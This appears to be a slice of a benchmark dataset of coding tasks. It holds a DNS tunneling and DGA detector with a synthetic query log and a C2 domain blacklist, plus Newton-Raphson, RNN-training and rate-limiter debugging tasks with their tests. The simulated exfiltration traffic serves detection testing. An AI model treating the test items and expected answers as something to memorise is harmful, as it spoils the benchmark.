    assert '192.168.1.103' in result.stdout
    # Check that it found the random-looking domains
    assert any(domain in result.stdout for domain in ['xjkl2983ndk.com', 'qpwo8374mzx.com', 'bvnm9283kds.com'])","{""test_dns_anomaly_detector_detects_tunneling"": 0.6, ""test_dns_investigate_generates_report"": 0.4}","{""dns_query.log"": ""2024-01-22 08:15:23.456 queries: client 192.168.1.100#45123 (google.com): query: google.com IN A +E (10.0.0.1)\n2024-01-22 08:15:23.457 queries: client 192.168.1.100#45124 (mail.google.com): query: mail.google.com IN A +E (10.0.0.1)\n2024-01-22 08:15:24.123 queries: client 192.168.1.101#52341 (abcd1234efgh5678ijkl9012mnop3456qrst7890uvwx.tunneldomain.com): query: abcd1234efgh5678ijkl9012mnop3456qrst7890uvwx.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:24.234 queries: client 192.168.1.101#52342 (wxyz4321dcba8765lkji2109ponm6543tsrq0987vuyx.tunneldomain.com): query: wxyz4321dcba8765lkji2109ponm6543tsrq0987vuyx.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:24.345 queries: client 192.168.1.101#52343 (data1234567890abcdefghijklmnopqrstuvwxyz123456.tunneldomain.com): query: data1234567890abcdefghijklmnopqrstuvwxyz123456.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:24.456 queries: client 192.168.1.102#33421 (facebook.com): query: facebook.com IN A +E (10.0.0.1)\n2024-01-22 08:15:24.567 queries: client 192.168.1.103#44123 (xjkl2983ndk.com): query: xjkl2983ndk.com IN A +E (10.0.0.1)\n2024-01-22 08:15:24.678 queries: client 192.168.1.103#44124 (qpwo8374mzx.com): query: qpwo8374mzx.com IN A +E (10.0.0.1)\n2024-01-22 08:15:24.789 queries: client 192.168.1.103#44125 (bvnm9283kds.com): query: bvnm9283kds.com IN A +E (10.0.0.1)\n2024-01-22 08:15:24.890 queries: client 192.168.1.103#44126 (tyui3847wer.com): query: tyui3847wer.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.012 queries: client 192.168.1.103#44127 (hjkl0923bnm.com): query: hjkl0923bnm.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.123 queries: client 192.168.1.104#55123 (amazon.com): query: amazon.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.234 queries: client 192.168.1.105#66123 (stackoverflow.com): query: stackoverflow.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.345 queries: client 192.168.1.106#77123 (github.com): query: github.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.456 queries: client 192.168.1.101#52344 (base64encodeddata9876543210abcdefghijklmnopqr.tunneldomain.com): query: base64encodeddata9876543210abcdefghijklmnopqr.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:25.567 queries: client 192.168.1.107#88123 (linkedin.com): query: linkedin.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.678 queries: client 192.168.1.108#99123 (reddit.com): query: reddit.com IN A +E (10.0.0.1)\n2024-01-22 08:15:25.789 queries: client 192.168.1.103#44128 (zxcv0192jkl.net): query: zxcv0192jkl.net IN A +E (10.0.0.1)\n2024-01-22 08:15:25.890 queries: client 192.168.1.103#44129 (poiu8273mnb.org): query: poiu8273mnb.org IN A +E (10.0.0.1)\n2024-01-22 08:15:26.012 queries: client 192.168.1.109#11123 (twitter.com): query: twitter.com IN A +E (10.0.0.1)\n2024-01-22 08:15:26.123 queries: client 192.168.1.110#22123 (youtube.com): query: youtube.com IN A +E (10.0.0.1)\n2024-01-22 08:15:26.234 queries: client 192.168.1.111#33123 (wikipedia.org): query: wikipedia.org IN A +E (10.0.0.1)\n2024-01-22 08:15:26.345 queries: client 192.168.1.101#52345 (tunnel9876543210fedcbazyxwvutsrqponmlkjihgfed.tunneldomain.com): query: tunnel9876543210fedcbazyxwvutsrqponmlkjihgfed.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:26.456 queries: client 192.168.1.112#44123 (microsoft.com): query: microsoft.com IN A +E (10.0.0.1)\n2024-01-22 08:15:26.567 queries: client 192.168.1.113#55123 (apple.com): query: apple.com IN A +E (10.0.0.1)\n2024-01-22 08:15:26.678 queries: client 192.168.1.103#44130 (lkjh9283nmd.biz): query: lkjh9283nmd.biz IN A +E (10.0.0.1)\n2024-01-22 08:15:26.789 queries: client 192.168.1.103#44131 (asdf7364qwe.info): query: asdf7364qwe.info IN A +E (10.0.0.1)\n2024-01-22 08:15:26.890 queries: client 192.168.1.114#66123 (netflix.com): query: netflix.com IN A +E (10.0.0.1)\n2024-01-22 08:15:27.012 queries: client 192.168.1.115#77123 (dropbox.com): query: dropbox.com IN A +E (10.0.0.1)\n2024-01-22 08:15:27.123 queries: client 192.168.1.101#52346 (exfiltration0123456789abcdefghijklmnopqrstuv.tunneldomain.com): query: exfiltration0123456789abcdefghijklmnopqrstuv.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:27.234 queries: client 192.168.1.116#88123 (slack.com): query: slack.com IN A +E (10.0.0.1)\n2024-01-22 08:15:27.345 queries: client 192.168.1.117#99123 (zoom.us): query: zoom.us IN A +E (10.0.0.1)\n2024-01-22 08:15:27.456 queries: client 192.168.1.103#44132 (mnbv2938xcz.xyz): query: mnbv2938xcz.xyz IN A +E (10.0.0.1)\n2024-01-22 08:15:27.567 queries: client 192.168.1.103#44133 (qazw8374edc.top): query: qazw8374edc.top IN A +E (10.0.0.1)\n2024-01-22 08:15:27.678 queries: client 192.168.1.118#10123 (office365.com): query: office365.com IN A +E (10.0.0.1)\n2024-01-22 08:15:27.789 queries: client 192.168.1.119#20123 (spotify.com): query: spotify.com IN A +E (10.0.0.1)\n2024-01-22 08:15:27.890 queries: client 192.168.1.101#52347 (final1234567890zyxwvutsrqponmlkjihgfedcba098.tunneldomain.com): query: final1234567890zyxwvutsrqponmlkjihgfedcba098.tunneldomain.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:28.012 queries: client 192.168.1.120#30123 (paypal.com): query: paypal.com IN A +E (10.0.0.1)\n2024-01-22 08:15:28.123 queries: client 192.168.1.103#44134 (rfvt5678yhn.club): query: rfvt5678yhn.club IN A +E (10.0.0.1)\n2024-01-22 08:15:28.234 queries: client 192.168.1.103#44135 (ujmk1029ilo.site): query: ujmk1029ilo.site IN A +E (10.0.0.1)\n2024-01-22 08:15:28.345 queries: client 192.168.1.121#40123 (ebay.com): query: ebay.com IN A +E (10.0.0.1)\n2024-01-22 08:15:28.456 queries: client 192.168.1.122#50123 (yahoo.com): query: yahoo.com IN A +E (10.0.0.1)\n2024-01-22 08:15:28.567 queries: client 192.168.1.100#45125 (_dmarc.google.com): query: _dmarc.google.com IN TXT +E (10.0.0.1)\n2024-01-22 08:15:28.678 queries: client 192.168.1.103#44136 (wsxz3847edc.online): query: wsxz3847edc.online IN A +E (10.0.0.1)\n2024-01-22 08:15:28.789 queries: client 192.168.1.103#44137 (plok9283mju.download): query: plok9283mju.download IN A +E (10.0.0.1)\n2024-01-22 08:15:28.890 queries: client 192.168.1.123#60123 (adobe.com): query: adobe.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.012 queries: client 192.168.1.101#52348 (0.tunneldomain.com): query: 0.tunneldomain.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.123 queries: client 192.168.1.124#70123 (salesforce.com): query: salesforce.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.234 queries: client 192.168.1.125#80123 (oracle.com): query: oracle.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.345 queries: client 192.168.1.103#44138 (nhyt6543rfv.space): query: nhyt6543rfv.space IN A +E (10.0.0.1)\n2024-01-22 08:15:29.456 queries: client 192.168.1.103#44139 (bgvc0987ytr.click): query: bgvc0987ytr.click IN A +E (10.0.0.1)\n2024-01-22 08:15:29.567 queries: client 192.168.1.126#90123 (cisco.com): query: cisco.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.678 queries: client 192.168.1.127#12123 (vmware.com): query: vmware.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.789 queries: client 192.168.1.104#55124 (www.amazon.com): query: www.amazon.com IN A +E (10.0.0.1)\n2024-01-22 08:15:29.890 queries: client 192.168.1.103#44140 (lokm2938ijn.link): query: lokm2938ijn.link IN A +E (10.0.0.1)\n2024-01-22 08:15:30.012 queries: client 192.168.1.128#34123 (ibm.com): query: ibm.com IN A +E (10.0.0.1)\n2024-01-22 08:15:30.123 queries: client 192.168.1.101#52349 (knownbad.malicious.com): query: knownbad.malicious.com IN A +E (10.0.0.1)\n2024-01-22 08:15:30.234 queries: client 192.168.1.129#56123 (dell.com): query: dell.com IN A +E (10.0.0.1)\n2024-01-22 08:15:30.345 queries: client 192.168.1.103#44141 (qpwo1827bnm.tech): query: qpwo1827bnm.tech IN A +E (10.0.0.1)\n2024-01-22 08:15:30.456 queries: client 192.168.1.101#52350 (c2server.evil.org): query: c2server.evil.org IN A +E (10.0.0.1)\n2024-01-22 08:15:30.567 queries: client 192.168.1.130#78123 (hp.com): query: hp.com IN A +E (10.0.0.1)"", ""config.json"": ""{\n  \""entropy_threshold\"": 3.5,\n  \""max_subdomain_length\"": 50,\n  \""dga\"": {\n    \""min_domains_per_minute\"": 5,\n    \""max_domain_length\"": 15,\n    \""consonant_ratio_threshold\"": 0.7\n  },\n  \""tunneling\"": {\n    \""txt_query_threshold\"": 3,\n    \""subdomain_entropy_threshold\"": 4.0,\n    \""max_query_size\"": 255\n  },\n  \""blacklist\"": [\n    \""malicious.com\"",\n    \""evil.org\"",\n    \""badsite.net\"",\n    \""c2server.evil.org\"",\n    \""knownbad.malicious.com\""\n  ],\n  \""whitelist\"": [\n    \""google.com\"",\n    \""facebook.com\"",\n    \""amazon.com\"",\n    \""microsoft.com\"",\n    \""apple.com\"",\n    \""github.com\"",\n    \""stackoverflow.com\"",\n    \""linkedin.com\"",\n    \""twitter.com\"",\n    \""youtube.com\"",\n    \""wikipedia.org\"",\n    \""reddit.com\"",\n    \""netflix.com\"",\n    \""dropbox.com\"",\n    \""slack.com\"",\n    \""zoom.us\"",\n    \""office365.com\"",\n    \""spotify.com\"",\n    \""paypal.com\"",\n    \""ebay.com\"",\n    \""yahoo.com\"",\n    \""adobe.com\"",\n    \""salesforce.com\"",\n    \""oracle.com\"",\n    \""cisco.com\"",\n    \""vmware.com\"",\n    \""ibm.com\"",\n    \""dell.com\"",\n    \""hp.com\""\n  ],\n  \""query_frequency\"": {\n    \""window_seconds\"": 60,\n    \""max_queries_per_client\"": 50\n  }\n}""}",2025-07-22T21:26:44.648927+00:00,2025-07-22T21:26:44.686316+00:00
draft_dp_784f1bf3,medium,draft_dp_784f1bf3,scientific-computing,The Newton-Raphson solver in newton_solver.py keeps diverging. Need it to find all real roots for the test polynomials within tolerance 1e-12.,scientific-computing,python|algorithms|debugging,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install numpy scipy

COPY newton_solver.py /workspace/
COPY polynomials.py /workspace/
COPY run_solver.py /workspace/

CMD [""bash""]","import subprocess
import json
import os

def test_solver_finds_all_roots():
    """"""Test that the Newton-Raphson solver finds all roots correctly.""""""
    # Run the solver
    result = subprocess.run(['python', '/workspace/run_solver.py'], 
                          capture_output=True, text=True, cwd='/workspace')
    
    # Check that the solver completed successfully (exit code 0)
    assert result.returncode == 0, f""Solver failed with exit code {result.returncode}""
    
    # Check output contains success message
    assert ""All tests PASSED!"" in result.stdout, ""Solver did not find all roots correctly""

def test_roots_within_tolerance():
    """"""Test that found roots satisfy f(x) ≈ 0 within tolerance.""""""
    # Create a test script to verify roots
    test_script = """"""
import sys
sys.path.append('/workspace')
from newton_solver import NewtonRaphsonSolver
from polynomials import TestPolynomials

solver = NewtonRaphsonSolver()
all_valid = True

# Test on the cubic polynomial
f, df, _ = TestPolynomials.cubic()
roots = solver.find_all_roots(f, df)

for root in roots:
    if abs(f(root)) > solver.tolerance:
        print(f""Root {root} has f(x) = {f(root)}"")
        all_valid = False

if all_valid and len(roots) == 3:  # cubic should have 3 roots
    print(""PASS"")
else:
    print(""FAIL"")
""""""
    
    # Write and execute the test script
    with open('/tmp/test_roots.py', 'w') as f:
        f.write(test_script)
    
    result = subprocess.run(['python', '/tmp/test_roots.py'], 
                          capture_output=True, text=True)
    
    assert ""PASS"" in result.stdout, ""Roots do not satisfy tolerance requirement""","{""test_solver_finds_all_roots"": 0.7, ""test_roots_within_tolerance"": 0.3}","{""newton_solver.py"": ""import numpy as np\nfrom typing import List, Tuple, Callable, Optional\n\nclass NewtonRaphsonSolver:\n    def __init__(self, tolerance: float = 1e-12, max_iterations: int = 100):\n        self.tolerance = tolerance\n        self.max_iterations = max_iterations\n        self.roots_found = []\n    \n    def find_root(self, f: Callable, df: Callable, x0: float) -> Optional[float]:\n        \""\""\""Find a single root starting from initial guess x0.\""\""\""\n        x = x0\n        \n        for i in range(self.max_iterations):\n            fx = f(x)\n            \n            if abs(fx) < self.tolerance:\n                return x\n            \n            dfx = df(x)\n            \n            # Bug: No check for zero derivative\n            x = x - fx / dfx\n            \n            # Bug: No bounds checking\n            \n        return None\n    \n    def find_all_roots(self, f: Callable, df: Callable, \n                      search_interval: Tuple[float, float] = (-10, 10),\n                      num_initial_guesses: int = 20) -> List[float]:\n        \""\""\""Find all real roots in the search interval.\""\""\""\n        a, b = search_interval\n        initial_guesses = np.linspace(a, b, num_initial_guesses)\n        roots = []\n        \n        for x0 in initial_guesses:\n            root = self.find_root(f, df, x0)\n            \n            if root is not None:\n                # Bug: Poor duplicate detection\n                is_new = True\n                for r in roots:\n                    if abs(root - r) < 0.01:  # Too loose tolerance\n                        is_new = False\n                        break\n                \n                if is_new and a <= root <= b:\n                    roots.append(root)\n        \n        return sorted(roots)\n    \n    def verify_root(self, f: Callable, x: float) -> bool:\n        \""\""\""Verify that x is indeed a root.\""\""\""\n        return abs(f(x)) < self.tolerance"", ""polynomials.py"": ""import numpy as np\n\nclass TestPolynomials:\n    \""\""\""Collection of test polynomials with known roots.\""\""\""\n    \n    @staticmethod\n    def linear():\n        \""\""\""f(x) = 2x - 4, root at x = 2\""\""\""\n        f = lambda x: 2*x - 4\n        df = lambda x: 2\n        true_roots = [2.0]\n        return f, df, true_roots\n    \n    @staticmethod\n    def quadratic():\n        \""\""\""f(x) = x^2 - 5x + 6 = (x-2)(x-3), roots at x = 2, 3\""\""\""\n        f = lambda x: x**2 - 5*x + 6\n        df = lambda x: 2*x - 5\n        true_roots = [2.0, 3.0]\n        return f, df, true_roots\n    \n    @staticmethod\n    def cubic():\n        \""\""\""f(x) = x^3 - 6x^2 + 11x - 6 = (x-1)(x-2)(x-3), roots at x = 1, 2, 3\""\""\""\n        f = lambda x: x**3 - 6*x**2 + 11*x - 6\n        df = lambda x: 3*x**2 - 12*x + 11\n        true_roots = [1.0, 2.0, 3.0]\n        return f, df, true_roots\n    \n    @staticmethod\n    def quartic_with_repeated_root():\n        \""\""\""f(x) = (x-1)^2(x+2)(x-3) = x^4 - 3x^3 - 3x^2 + 11x - 6\""\""\""\n        f = lambda x: x**4 - 3*x**3 - 3*x**2 + 11*x - 6\n        df = lambda x: 4*x**3 - 9*x**2 - 6*x + 11\n        true_roots = [-2.0, 1.0, 1.0, 3.0]  # 1.0 is a repeated root\n        return f, df, true_roots\n    \n    @staticmethod\n    def quintic():\n        \""\""\""f(x) = x^5 - 15x^3 + 10x^2 + 60x - 72, roots at -3, -2, 2, 3, 4\""\""\""\n        f = lambda x: x**5 - 15*x**3 + 10*x**2 + 60*x - 72\n        df = lambda x: 5*x**4 - 45*x**2 + 20*x + 60\n        true_roots = [-3.0, -2.0, 2.0, 3.0, 4.0]\n        return f, df, true_roots\n    \n    @staticmethod\n    def get_all_test_cases():\n        \""\""\""Return all test cases as a list of (name, f, df, true_roots) tuples.\""\""\""\n        return [\n            (\""linear\"", *TestPolynomials.linear()),\n            (\""quadratic\"", *TestPolynomials.quadratic()),\n            (\""cubic\"", *TestPolynomials.cubic()),\n            (\""quartic_with_repeated_root\"", *TestPolynomials.quartic_with_repeated_root()),\n            (\""quintic\"", *TestPolynomials.quintic())\n        ]"", ""run_solver.py"": ""#!/usr/bin/env python3\n\nimport numpy as np\nfrom newton_solver import NewtonRaphsonSolver\nfrom polynomials import TestPolynomials\n\ndef run_all_tests():\n    \""\""\""Run the Newton-Raphson solver on all test polynomials.\""\""\""\n    solver = NewtonRaphsonSolver()\n    test_cases = TestPolynomials.get_all_test_cases()\n    \n    print(\""Newton-Raphson Root Finding Results\"")\n    print(\""=\"" * 50)\n    \n    all_passed = True\n    \n    for name, f, df, true_roots in test_cases:\n        print(f\""\\nTesting {name} polynomial:\"")\n        print(f\""Expected roots: {true_roots}\"")\n        \n        found_roots = solver.find_all_roots(f, df)\n        print(f\""Found roots: {found_roots}\"")\n        \n        # Check if we found all roots\n        unique_true_roots = sorted(list(set(true_roots)))\n        \n        if len(found_roots) != len(unique_true_roots):\n            print(f\""ERROR: Expected {len(unique_true_roots)} unique roots, found {len(found_roots)}\"")\n            all_passed = False\n        else:\n            # Verify each found root\n            all_valid = True\n            for root in found_roots:\n                if not solver.verify_root(f, root):\n                    print(f\""ERROR: Found root {root} does not satisfy f(x) \u2248 0\"")\n                    all_valid = False\n                    all_passed = False\n            \n            if all_valid:\n                # Check if found roots match expected roots\n                matched = True\n                for true_root in unique_true_roots:\n                    found_match = False\n                    for found_root in found_roots:\n                        if abs(found_root - true_root) < solver.tolerance * 100:\n                            found_match = True\n                            break\n                    if not found_match:\n                        print(f\""ERROR: Expected root {true_root} not found\"")\n                        matched = False\n                        all_passed = False\n                \n                if matched and all_valid:\n                    print(\""SUCCESS: All roots found correctly!\"")\n    \n    print(\""\\n\"" + \""=\"" * 50)\n    if all_passed:\n        print(\""All tests PASSED!\"")\n    else:\n        print(\""Some tests FAILED!\"")\n    \n    return all_passed\n\nif __name__ == \""__main__\"":\n    success = run_all_tests()\n    exit(0 if success else 1)""}",2025-07-22T21:28:31.052982+00:00,2025-07-22T21:28:31.088025+00:00
draft_dp_7e17aab0,hard,draft_dp_7e17aab0,machine-learning,The RNN training in train.py keeps failing with NaN loss after a few epochs. Fix the gradient explosion issue without changing learning rate (0.001) or epochs (50). The model needs to successfully train on the time series data.,machine-learning,pytorch|debugging|model-training,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install PyTorch and dependencies
RUN pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cpu && \
    pip install numpy matplotlib

# Copy application files
COPY rnn_model.py /app/
COPY train.py /app/
COPY data_generator.py /app/
COPY config.py /app/

# Set random seed for reproducibility
ENV PYTHONHASHSEED=0

CMD [""python"", ""train.py""]","import json
import os
import subprocess

def test_training_completes_successfully():
    """"""Test that training completes all 50 epochs without NaN/Inf.""""""
    # Check if results file exists
    assert os.path.exists('training_results.json'), ""Training results file not found""
    
    with open('training_results.json', 'r') as f:
        results = json.load(f)
    
    # Check that all epochs completed
    assert results['epochs_completed'] == 50, f""Training stopped early at epoch {results['epochs_completed']}""
    
    # Check that training was marked successful
    assert results['training_successful'] == True, ""Training was not successful""
    
    # Check that final losses are not NaN or Inf
    import math
    assert not math.isnan(results['final_train_loss']), ""Final train loss is NaN""
    assert not math.isinf(results['final_train_loss']), ""Final train loss is Inf""
    assert not math.isnan(results['final_test_loss']), ""Final test loss is NaN""
    assert not math.isinf(results['final_test_loss']), ""Final test loss is Inf""

def test_gradients_remain_bounded():
    """"""Test that gradients remain bounded throughout training.""""""
    assert os.path.exists('training_results.json'), ""Training results file not found""
    
    with open('training_results.json', 'r') as f:
        results = json.load(f)
    
    # Check maximum gradient norm
    max_grad = results['max_gradient_norm']
    assert max_grad < 100.0, f""Maximum gradient norm {max_grad} exceeds threshold of 100.0""
    assert max_grad > 0.0, ""Maximum gradient norm should be positive""

def test_model_learns_patterns():
    """"""Test that the model achieves reasonable performance on the task.""""""
    assert os.path.exists('training_results.json'), ""Training results file not found""
    
    with open('training_results.json', 'r') as f:
        results = json.load(f)
    
    # Check that test loss is reasonable (model learned something)
    test_loss = results['final_test_loss']
    
    # For this synthetic data task, a trained model should achieve test loss < 0.5
    assert test_loss < 0.5, f""Test loss {test_loss} is too high - model didn't learn effectively""
    
    # Also check that training loss decreased (model is learning)
    assert results['final_train_loss'] < 0.5, ""Training loss didn't decrease sufficiently""","{""test_training_completes_successfully"": 0.4, ""test_gradients_remain_bounded"": 0.4, ""test_model_learns_patterns"": 0.2}","{""config.py"": ""# Model configuration\nINPUT_SIZE = 3          # Number of input features\nHIDDEN_SIZE = 64        # Hidden layer size\nOUTPUT_SIZE = 1         # Output size (predicting next value)\nNUM_LAYERS = 2          # Number of RNN layers\nSEQ_LENGTH = 20         # Sequence length\n\n# Training configuration\nLEARNING_RATE = 0.001   # Fixed - do not change\nN_EPOCHS = 50           # Fixed - do not change\nBATCH_SIZE = 32         # Batch size for training\nN_SAMPLES = 1000        # Number of training samples\n\n# Other settings\nRANDOM_SEED = 42        # For reproducibility\nGRADIENT_THRESHOLD = 100.0  # Max allowed gradient norm"", ""train.py"": ""import torch\nimport torch.nn as nn\nimport torch.optim as optim\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom rnn_model import SimpleRNN\nfrom data_generator import generate_time_series_data\nfrom config import *\nimport json\nimport os\n\ndef train_model():\n    # Set random seeds for reproducibility\n    torch.manual_seed(RANDOM_SEED)\n    np.random.seed(RANDOM_SEED)\n    \n    # Generate data\n    X_train, y_train, X_test, y_test = generate_time_series_data(\n        n_samples=N_SAMPLES, \n        seq_length=SEQ_LENGTH,\n        n_features=INPUT_SIZE\n    )\n    \n    # Convert to tensors\n    X_train = torch.FloatTensor(X_train)\n    y_train = torch.FloatTensor(y_train)\n    X_test = torch.FloatTensor(X_test)\n    y_test = torch.FloatTensor(y_test)\n    \n    # Initialize model\n    model = SimpleRNN(INPUT_SIZE, HIDDEN_SIZE, OUTPUT_SIZE, NUM_LAYERS)\n    \n    # Loss and optimizer\n    criterion = nn.MSELoss()\n    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)\n    \n    # Training history\n    train_losses = []\n    test_losses = []\n    gradient_norms = []\n    \n    print(f\""Starting training for {N_EPOCHS} epochs...\"")\n    \n    for epoch in range(N_EPOCHS):\n        # Training\n        model.train()\n        optimizer.zero_grad()\n        \n        # Forward pass\n        outputs = model(X_train)\n        loss = criterion(outputs, y_train)\n        \n        # Backward pass\n        loss.backward()\n        \n        # Get gradient norm before optimizer step\n        grad_norm = model.get_gradients()\n        gradient_norms.append(grad_norm)\n        \n        # Optimizer step\n        optimizer.step()\n        \n        # Evaluate on test set\n        model.eval()\n        with torch.no_grad():\n            test_outputs = model(X_test)\n            test_loss = criterion(test_outputs, y_test)\n        \n        train_losses.append(loss.item())\n        test_losses.append(test_loss.item())\n        \n        if (epoch + 1) % 10 == 0:\n            print(f\""Epoch [{epoch+1}/{N_EPOCHS}], Train Loss: {loss.item():.4f}, Test Loss: {test_loss.item():.4f}, Grad Norm: {grad_norm:.4f}\"")\n        \n        # Check for NaN\n        if np.isnan(loss.item()) or np.isinf(loss.item()):\n            print(f\""Training failed at epoch {epoch+1} with NaN/Inf loss!\"")\n            break\n    \n    # Save results\n    results = {\n        'final_train_loss': train_losses[-1] if train_losses else float('nan'),\n        'final_test_loss': test_losses[-1] if test_losses else float('nan'),\n        'max_gradient_norm': max(gradient_norms) if gradient_norms else float('nan'),\n        'epochs_completed': len(train_losses),\n        'training_successful': len(train_losses) == N_EPOCHS and not np.isnan(train_losses[-1])\n    }\n    \n    with open('training_results.json', 'w') as f:\n        json.dump(results, f, indent=2)\n    \n    # Plot training curves\n    plt.figure(figsize=(12, 4))\n    \n    plt.subplot(1, 3, 1)\n    plt.plot(train_losses, label='Train Loss')\n    plt.plot(test_losses, label='Test Loss')\n    plt.xlabel('Epoch')\n    plt.ylabel('Loss')\n    plt.title('Training Progress')\n    plt.legend()\n    plt.yscale('log')\n    \n    plt.subplot(1, 3, 2)\n    plt.plot(gradient_norms)\n    plt.xlabel('Epoch')\n    plt.ylabel('Gradient Norm')\n    plt.title('Gradient Norms During Training')\n    plt.yscale('log')\n    \n    plt.subplot(1, 3, 3)\n    if len(train_losses) == N_EPOCHS:\n        # Plot predictions vs actual\n        model.eval()\n        with torch.no_grad():\n            predictions = model(X_test[:20]).numpy()\n            actuals = y_test[:20].numpy()\n        \n        plt.scatter(actuals, predictions, alpha=0.6)\n        plt.plot([actuals.min(), actuals.max()], [actuals.min(), actuals.max()], 'r--', lw=2)\n        plt.xlabel('Actual')\n        plt.ylabel('Predicted')\n        plt.title('Predictions vs Actual')\n    else:\n        plt.text(0.5, 0.5, 'Training Failed', ha='center', va='center', transform=plt.gca().transAxes)\n    \n    plt.tight_layout()\n    plt.savefig('training_plots.png')\n    plt.close()\n    \n    print(f\""\\nTraining completed. Results saved to training_results.json\"")\n    print(f\""Final gradient norm: {gradient_norms[-1] if gradient_norms else 'N/A'}\"")\n    \n    return results\n\nif __name__ == '__main__':\n    train_model()"", ""rnn_model.py"": ""import torch\nimport torch.nn as nn\n\nclass SimpleRNN(nn.Module):\n    def __init__(self, input_size, hidden_size, output_size, num_layers=2):\n        super(SimpleRNN, self).__init__()\n        self.hidden_size = hidden_size\n        self.num_layers = num_layers\n        \n        # Using basic RNN which is prone to gradient issues\n        self.rnn = nn.RNN(input_size, hidden_size, num_layers, batch_first=True)\n        \n        # Output layer with no initialization - can contribute to instability\n        self.fc = nn.Linear(hidden_size, output_size)\n        \n        # Initialize weights with large values - causes gradient explosion\n        for name, param in self.named_parameters():\n            if 'weight' in name:\n                nn.init.uniform_(param, -2.0, 2.0)\n            elif 'bias' in name:\n                nn.init.constant_(param, 0)\n    \n    def forward(self, x):\n        batch_size = x.size(0)\n        \n        # Initialize hidden state\n        h0 = torch.zeros(self.num_layers, batch_size, self.hidden_size)\n        \n        # Forward propagate RNN\n        out, _ = self.rnn(x, h0)\n        \n        # Decode the hidden state of the last time step\n        out = self.fc(out[:, -1, :])\n        \n        return out\n    \n    def get_gradients(self):\n        \""\""\""Get gradient norms for monitoring\""\""\""\n        total_norm = 0\n        param_count = 0\n        for p in self.parameters():\n            if p.grad is not None:\n                param_norm = p.grad.data.norm(2)\n                total_norm += param_norm.item() ** 2\n                param_count += 1\n        total_norm = total_norm ** (1. / 2.)\n        return total_norm"", ""data_generator.py"": ""import numpy as np\n\ndef generate_time_series_data(n_samples=1000, seq_length=20, n_features=1, noise_level=0.1):\n    \""\""\""\n    Generate synthetic time series data with temporal patterns.\n    The task is to predict the next value based on the sequence.\n    \""\""\""\n    np.random.seed(42)  # Fixed seed for data generation\n    \n    X = np.zeros((n_samples, seq_length, n_features))\n    y = np.zeros((n_samples, 1))\n    \n    for i in range(n_samples):\n        # Generate base pattern - combination of sine waves\n        t = np.linspace(0, 4*np.pi, seq_length)\n        \n        for j in range(n_features):\n            # Different frequency for each feature\n            freq = 1 + j * 0.5\n            amplitude = 1 + j * 0.2\n            \n            # Create pattern with some complexity\n            pattern = amplitude * np.sin(freq * t) + 0.5 * np.sin(2 * freq * t)\n            \n            # Add noise\n            pattern += np.random.normal(0, noise_level, seq_length)\n            \n            X[i, :, j] = pattern\n        \n        # Target is a non-linear combination of the last few values\n        # This creates a learnable but non-trivial pattern\n        y[i, 0] = 0.3 * X[i, -1, 0] + 0.5 * X[i, -2, 0] + 0.2 * X[i, -3, 0]\n        \n        # Add some non-linearity\n        if y[i, 0] > 0.5:\n            y[i, 0] = y[i, 0] ** 1.2\n        else:\n            y[i, 0] = y[i, 0] ** 0.8\n    \n    # Split into train and test\n    split_idx = int(0.8 * n_samples)\n    X_train, X_test = X[:split_idx], X[split_idx:]\n    y_train, y_test = y[:split_idx], y[split_idx:]\n    \n    return X_train, y_train, X_test, y_test""}",2025-07-22T21:29:27.938898+00:00,2025-07-22T21:29:27.970860+00:00
draft_dp_0e816c4e,medium,draft_dp_0e816c4e,software-engineering,The rate limiter is dropping legitimate requests. Fix it to handle 10k req/s with proper sliding windows and make sure premium clients get 1000 req/min while basic get 100.,software-engineering,performance-optimization|caching|algorithms,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install required tools
RUN apt-get update && apt-get install -y \
    jq \
    bc \
    curl \
    && rm -rf /var/lib/apt/lists/*

# Copy application files
COPY rate_limiter.sh /app/
COPY test_load.sh /app/
COPY config.json /app/

# Make scripts executable
RUN chmod +x /app/rate_limiter.sh /app/test_load.sh

# Create test environment
RUN mkdir -p /tmp/rate_limits

CMD [""/bin/bash""]","import subprocess
import json
import time
import os

def test_sliding_window_rate_limiting():
    """"""Test that rate limiter properly implements sliding window for premium clients""""""
    client_id = ""test_premium_client""
    
    # Clear any existing counters
    subprocess.run([""rm"", ""-rf"", ""/tmp/rate_limits""], capture_output=True)
    subprocess.run([""mkdir"", ""-p"", ""/tmp/rate_limits""], capture_output=True)
    
    # Test that we can make 1000 requests per minute for premium
    allowed_count = 0
    start_time = time.time()
    
    # Make 1100 requests over 65 seconds
    for i in range(1100):
        if i == 1000:
            # After 1000 requests, wait until we're past 60 seconds
            elapsed = time.time() - start_time
            if elapsed < 61:
                time.sleep(61 - elapsed)
        
        result = subprocess.run(
            [""./rate_limiter.sh"", client_id, ""premium""],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if data.get(""allowed""):
                allowed_count += 1
    
    # Should allow ~1000 in first minute, plus some in the next window
    assert 1000 <= allowed_count <= 1050, f""Expected ~1000-1050 allowed requests, got {allowed_count}""

def test_tier_based_limits():
    """"""Test that different tiers get correct rate limits""""""
    # Clear counters
